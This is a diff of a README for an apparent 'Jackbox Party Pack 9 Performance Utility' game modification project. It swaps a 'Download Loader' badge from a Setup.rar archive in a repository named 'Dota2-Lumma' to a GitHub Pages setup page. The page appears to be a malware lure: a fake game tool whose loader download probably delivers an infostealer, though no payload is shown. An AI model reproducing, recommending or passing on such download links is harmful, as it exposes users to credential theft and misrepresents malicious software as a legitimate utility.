@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Jackbox Party Pack 9 Performance Utility
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Jackbox-Party-Pack-9-Performance-Utility` · Updated: 2026-10-28
 
 **Tags:** `jackbox-party-pack-9` `performance-utility` `pc-gaming` `gameplay` `progress-tracking` `windows` `steam`
+
 
 
 
